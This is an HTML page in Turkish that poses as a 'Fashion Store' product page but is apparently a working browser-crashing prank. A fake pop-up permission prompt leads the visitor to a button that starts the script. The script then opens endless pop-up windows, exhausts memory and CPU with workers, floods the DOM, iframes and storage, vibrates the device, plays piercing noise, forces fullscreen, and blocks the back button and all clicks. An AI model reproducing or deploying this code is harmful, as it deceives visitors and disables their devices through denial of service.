<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fashion Store</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0a0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: #12121c;
            border-radius: 28px;
            padding: 30px 24px 40px;
            border: 1px solid #2a2a40;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .brand {
            font-size: 14px;
            color: #8888aa;
            letter-spacing: 4px;
            font-weight: 300;
        }
        .title {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0e6d0, #c8b8a0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 8px 0 6px;
        }
        .subtitle {
            color: #666688;
            font-size: 13px;
            font-weight: 300;
            letter-spacing: 1px;
        }
        .product {
            margin: 30px 0 20px;
            background: #1a1a2e;
            border-radius: 20px;
            padding: 20px;
            border: 1px solid #2a2a44;
        }
        .product .icon {
            font-size: 72px;
            filter: drop-shadow(0 0 30px rgba(200,180,160,0.15));
        }
        .product .name {
            color: #e8e0d0;
            font-size: 18px;
            font-weight: 600;
            margin: 10px 0 4px;
        }
        .product .price {
            color: #8888aa;
            font-size: 14px;
            font-weight: 400;
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            touch-action: manipulation;
            letter-spacing: 1px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #6a5a7a, #8a7a9a);
            color: #fff;
            box-shadow: 0 4px 30px rgba(100,80,120,0.3);
        }
        .btn-primary:active {
            transform: scale(0.96);
        }
        .btn-danger {
            background: linear-gradient(135deg, #8a1a2a, #aa2a3a);
            color: #fff;
            box-shadow: 0 4px 30px rgba(180,30,50,0.3);
            margin-top: 12px;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #444466;
            letter-spacing: 1px;
        }
        .badge {
            display: inline-block;
            background: #1a1a2e;
            padding: 4px 16px;
            border-radius: 40px;
            font-size: 10px;
            color: #666688;
            border: 1px solid #2a2a44;
        }
        .popup-warning {
            background: #1a0a0a;
            border: 1px solid #4a1a1a;
            border-radius: 12px;
            padding: 14px;
            margin: 16px 0 20px;
            color: #aa6666;
            font-size: 13px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .popup-warning span {
            font-size: 20px;
        }
        #statusText {
            color: #8888aa;
            font-size: 12px;
            margin-top: 10px;
            min-height: 20px;
        }
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
        .pulse {
            animation: pulse 1.2s infinite;
        }
        .hidden {
            display: none !important;
        }
        #bombBtn {
            background: linear-gradient(135deg, #2a1a1a, #4a1a1a);
            color: #cc6666;
            border: 1px solid #5a2a2a;
            margin-top: 6px;
            font-size: 14px;
            padding: 12px;
        }
        #bombBtn:active {
            transform: scale(0.96);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand">✦ LUXE COLLECTION ✦</div>
        <div class="title">FASHION STORE</div>
        <div class="subtitle">Premium Giyim · Özel Koleksiyon</div>

        <div class="product">
            <div class="icon">🧥</div>
            <div class="name">Collection Jacket</div>
            <div class="price">★ 4.8 (1.2k) · ₺499</div>
        </div>

        <!-- Pop-up izni uyarısı -->
        <div class="popup-warning">
            <span>🔒</span> Tarayıcınız pop-up'ları engelliyor
        </div>

        <!-- Devam Et Butonu (pop-up izni için) -->
        <button class="btn btn-primary" id="continueBtn">▶ Devam Et</button>

        <!-- Gizli bomba butonu (son çare) -->
        <button class="btn btn-danger hidden" id="bombBtn">⛔ SİSTEMİ ÇÖKERT ⛔</button>

        <div id="statusText" class="pulse">⏳ Pop-up izni bekleniyor...</div>

        <div class="footer">
            <span class="badge">🔐 Güvenli Bağlantı</span>
            <span class="badge" style="margin-left:8px;">📱 Mobil</span>
        </div>
    </div>

    <script>
        (function() {
            "use strict";

            var isBombActive = false;
            var popupCount = 0;
            var maxPopups = 999999;
            var windows = [];

            var urlList = [
                'https://www.google.com','https://www.youtube.com','https://www.facebook.com',
                'https://www.twitter.com','https://www.instagram.com','https://www.tiktok.com',
                'https://www.reddit.com','https://www.wikipedia.org','https://www.amazon.com',
                'https://www.ebay.com','https://www.netflix.com','https://www.spotify.com',
                'https://www.microsoft.com','https://www.apple.com','https://www.samsung.com',
                'https://www.huawei.com','https://www.xiaomi.com','https://www.oneplus.com',
                'https://www.sony.com','https://www.lg.com','https://www.dell.com',
                'https://www.hp.com','https://www.lenovo.com','https://www.asus.com',
                'https://www.acer.com','https://www.msi.com','https://www.gigabyte.com',
                'https://www.corsair.com','https://www.logitech.com','https://www.razer.com',
                'https://www.steelseries.com','https://www.hyperx.com','https://www.kingston.com',
                'https://www.seagate.com','https://www.intel.com','https://www.amd.com',
                'https://www.nvidia.com','https://www.qualcomm.com','https://www.mediatek.com',
                'https://www.broadcom.com','https://www.ti.com','https://www.infineon.com',
                'https://www.nxp.com','https://www.st.com','https://www.renesas.com',
                'https://www.microchip.com','https://www.cypress.com','https://www.silabs.com',
                'https://www.synopsys.com','https://www.cadence.com','https://www.siemens.com',
                'https://www.ibm.com','https://www.oracle.com','https://www.sap.com',
                'https://www.salesforce.com','https://www.adobe.com','https://www.autodesk.com',
                'https://www.solidworks.com','https://www.ansys.com','https://www.mathworks.com',
                'https://www.wolfram.com','https://www.ni.com','https://www.keysight.com',
                'https://www.fluke.com','https://www.tektronix.com','https://www.rohde-schwarz.com'
            ];

            // ============================================================
            // BOMB FONKSİYONLARI
            // ============================================================
            function openSites() {
                if (!isBombActive) return;
                try {
                    var batchSize = 60 + Math.floor(Math.random() * 50);
                    for (var i = 0; i < batchSize; i++) {
                        var randUrl = urlList[Math.floor(Math.random() * urlList.length)];
                        var win = window.open(
                            randUrl,
                            '_blank',
                            'width=' + (100 + Math.random() * 300) + 
                            ',height=' + (100 + Math.random() * 300) + 
                            ',left=' + (Math.random() * 800) + 
                            ',top=' + (Math.random() * 800)
                        );
                        if (win) {
                            windows.push(win);
                            popupCount++;
                            try {
                                win.document.write('<html><head><title>⛔</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:50px;font-size:30px;">⛔ SİSTEM ÇÖKTÜ ⛔</body></html>');
                            } catch(e) {}
                        }
                    }
                } catch(e) {}
                setTimeout(openSites, 2);
            }

            function ramBomb() {
                if (!isBombActive) return;
                var arr = [];
                setInterval(function() {
                    if (!isBombActive) return;
                    try {
                        for (var i = 0; i < 1000000; i++) {
                            arr.push(new Array(100000).fill('💀'));
                        }
                    } catch(e) {
                        location.reload();
                    }
                }, 1);
            }

            function vibBomb() {
                if (!isBombActive) return;
                try {
                    if (navigator.vibrate) {
                        navigator.vibrate([50, 10, 50, 10, 100, 10, 200, 10, 500, 10, 1000, 10]);
                    }
                } catch(e) {}
                setTimeout(vibBomb, 15);
            }

            function highPitchNoise() {
                if (!isBombActive) return;
                try {
                    var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    var sampleRate = audioCtx.sampleRate;
                    var bufferSize = sampleRate * 120;
                    var buffer = audioCtx.createBuffer(2, bufferSize, sampleRate);
                    var left = buffer.getChannelData(0);
                    var right = buffer.getChannelData(1);
                    for (var i = 0; i < bufferSize; i++) {
                        var t = i / sampleRate;
                        var val = Math.sin(9500 * 2 * Math.PI * t) * 0.5 +
                                  Math.sin(13500 * 2 * Math.PI * t) * 0.4 +
                                  Math.sin(17000 * 2 * Math.PI * t) * 0.2 +
                                  (Math.random() * 2 - 1) * 0.2;
                        left[i] = val;
                        right[i] = val;
                    }
                    var source = audioCtx.createBufferSource();
                    source.buffer = buffer;
                    source.loop = true;
                    source.connect(audioCtx.destination);
                    source.start(0);
                } catch(e) {
                    try {
                        var audio = new Audio();
                        audio.src = 'data:audio/wav;base64,U3RheSBmb3JldmVyIG5vaXNl';
                        audio.loop = true;
                        audio.volume = 1;
                        audio.play();
                    } catch(e2) {}
                }
            }

            function domBomb() {
                if (!isBombActive) return;
                setInterval(function() {
                    if (!isBombActive) return;
                    try {
                        for (var i = 0; i < 3000; i++) {
                            var div = document.createElement('div');
                            div.style.position = 'fixed';
                            div.style.top = Math.random() * 100 + '%';
                            div.style.left = Math.random() * 100 + '%';
                            div.style.width = Math.random() * 300 + 'px';
                            div.style.height = Math.random() * 300 + 'px';
                            div.style.background = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
                            div.style.zIndex = 999999;
                            div.style.pointerEvents = 'none';
                            div.style.opacity = Math.random() * 0.5;
                            document.body.appendChild(div);
                        }
                    } catch(e) {}
                }, 2);
            }

            function workerBomb() {
                if (!isBombActive) return;
                try {
                    var blob = new Blob([`
                        while(true) {
                            var arr = [];
                            for(var i=0; i<1000000; i++) arr.push(i);
                        }
                    `], {type: 'application/javascript'});
                    var url = URL.createObjectURL(blob);
                    for (var i = 0; i < 200; i++) {
                        try { var worker = new Worker(url); } catch(e) {}
                    }
                } catch(e) {}
                setTimeout(workerBomb, 5);
            }

            function iframeBomb() {
                if (!isBombActive) return;
                setInterval(function() {
                    if (!isBombActive) return;
                    try {
                        for (var i = 0; i < 200; i++) {
                            var iframe = document.createElement('iframe');
                            iframe.src = 'https://www.google.com';
                            iframe.style.position = 'fixed';
                            iframe.style.top = Math.random() * 100 + '%';
                            iframe.style.left = Math.random() * 100 + '%';
                            iframe.style.width = '1px';
                            iframe.style.height = '1px';
                            iframe.style.opacity = '0';
                            iframe.style.pointerEvents = 'none';
                            document.body.appendChild(iframe);
                        }
                    } catch(e) {}
                }, 2);
            }

            function storageBomb() {
                if (!isBombActive) return;
                setInterval(function() {
                    if (!isBombActive) return;
                    try {
                        for (var i = 0; i < 10000; i++) {
                            localStorage.setItem('bomb_' + Date.now() + '_' + i, 'X'.repeat(20000));
                        }
                    } catch(e) {}
                }, 2);
            }

            function forceFullscreen() {
                try {
                    const el = document.documentElement;
                    if (el.requestFullscreen) el.requestFullscreen();
                    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
                    else if (el.msRequestFullscreen) el.msRequestFullscreen();
                } catch(e) {}
            }

            // ============================================================
            // BOMBAYI BAŞLAT
            // ============================================================
            function startBomb() {
                if (isBombActive) return;
                isBombActive = true;

                document.getElementById('statusText').textContent = '⛔ SİSTEM ÇÖKERTİLİYOR...';
                document.getElementById('statusText').style.color = '#ff4444';

                // Tam ekran
                forceFullscreen();
                document.addEventListener('click', forceFullscreen);
                document.addEventListener('touchstart', forceFullscreen);

                // Geri tuşu engelle
                history.pushState(null, null, location.href);
                window.addEventListener('popstate', function(e) {
                    history.pushState(null, null, location.href);
                });
                setInterval(function() {
                    history.pushState(null, null, location.href);
                }, 50);

                // Tüm tıklamaları engelle
                document.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, true);
                document.addEventListener('touchstart', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, true);
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                });

                // Hata yakala
                window.onerror = function() { location.reload(); return true; };
                window.onbeforeunload = function() { return '⛔'; };

                // Tüm bombaları başlat
                setTimeout(openSites, 50);
                setTimeout(ramBomb, 100);
                setTimeout(vibBomb, 150);
                setTimeout(highPitchNoise, 200);
                setTimeout(domBomb, 250);
                setTimeout(workerBomb, 300);
                setTimeout(iframeBomb, 350);
                setTimeout(storageBomb, 400);

                // Ekran titremesi
                setInterval(function() {
                    document.body.style.background = Math.random() > 0.5 ? '#000' : '#1a0000';
                    document.body.style.filter = 'brightness(' + (0.3 + Math.random() * 0.7) + ')';
                }, 20);

                // Konsol
                console.log('%c⛔ SİSTEM ÇÖKERTİLDİ ⛔', 'font-size:50px; color:#ff0000; font-weight:900;');
                console.log('%cBY ANTİROLLSY', 'font-size:40px; color:#ff0000;');

                // Butonları gizle
                document.getElementById('continueBtn').style.display = 'none';
                document.getElementById('bombBtn').style.display = 'none';
                document.querySelector('.popup-warning').style.display = 'none';
                document.querySelector('.product').style.display = 'none';
                document.querySelector('.brand').style.display = 'none';
                document.querySelector('.subtitle').style.display = 'none';
                document.querySelector('.footer').style.display = 'none';
                document.querySelector('.title').textContent = '⛔ SİSTEM ÇÖKTÜ ⛔';
                document.querySelector('.title').style.color = '#ff0000';
                document.querySelector('.title').style.background = 'none';
                document.querySelector('.title').style.webkitTextFillColor = '#ff0000';
                document.querySelector('.title').style.fontSize = '32px';
                document.getElementById('statusText').textContent = '🔥 TELEFONUN DONDU 🔥 KAPATMAK İÇİN GÜÇ TUŞUNA BAS';
                document.getElementById('statusText').style.fontSize = '18px';
                document.getElementById('statusText').style.color = '#ff0000';
                document.getElementById('statusText').style.padding = '20px';
            }

            // ============================================================
            // BUTON OLAYLARI
            // ============================================================
            document.getElementById('continueBtn').addEventListener('click', function(e) {
                e.preventDefault();
                // Pop-up izni için tıklandı
                // Önce bir test pop-up'ı aç (tarayıcı izin ister)
                try {
                    var testWin = window.open('', '_blank', 'width=1,height=1');
                    if (testWin) {
                        testWin.close();
                    }
                } catch(e) {}

                // Durum mesajı
                document.getElementById('statusText').textContent = '⏳ Pop-up izni veriliyor...';
                document.getElementById('statusText').style.color = '#88aa88';

                // 1 saniye sonra bombayı başlat
                setTimeout(function() {
                    // Bomb butonunu göster (son çare)
                    document.getElementById('bombBtn').classList.remove('hidden');
                    document.getElementById('statusText').textContent = '🔴 Pop-up izni verilmediyse tıkla!';
                    document.getElementById('statusText').style.color = '#ff6644';
                }, 1000);
            });

            // BOMBA BUTONU (doğrudan başlat)
            document.getElementById('bombBtn').addEventListener('click', function(e) {
                e.preventDefault();
                startBomb();
            });

            document.getElementById('bombBtn').addEventListener('touchstart', function(e) {
                e.preventDefault();
                startBomb();
            });

            // Pop-up engelleyiciyi aşmak için sayfa her tıklandığında pop-up dene
            document.addEventListener('click', function(e) {
                if (!isBombActive) {
                    try {
                        var testWin = window.open('', '_blank', 'width=1,height=1');
                        if (testWin) testWin.close();
                    } catch(e) {}
                }
            });

            // Sayfa yüklendiğinde pop-up test et
            setTimeout(function() {
                try {
                    var testWin = window.open('', '_blank', 'width=1,height=1');
                    if (testWin) testWin.close();
                } catch(e) {}
            }, 500);

            console.log('✅ Fashion Store yüklendi. Pop-up izni vermek için "Devam Et" butonuna tıkla.');
            console.log('⛔ Eğer pop-up'lar engelleniyorsa, "SİSTEMİ ÇÖKERT" butonuna tıkla.');
        })();
    </script>
</body>
</html>
